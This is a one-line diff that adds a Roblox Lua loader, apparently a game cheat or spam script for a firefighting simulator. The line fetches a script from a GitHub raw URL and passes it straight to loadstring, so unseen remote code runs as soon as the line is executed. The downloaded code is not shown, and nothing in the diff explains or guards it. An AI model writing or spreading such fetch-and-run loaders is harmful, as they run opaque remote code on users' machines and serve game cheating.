@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/upd-firefighting-sim-spam5-lko70wm3oacj55.lua"))()
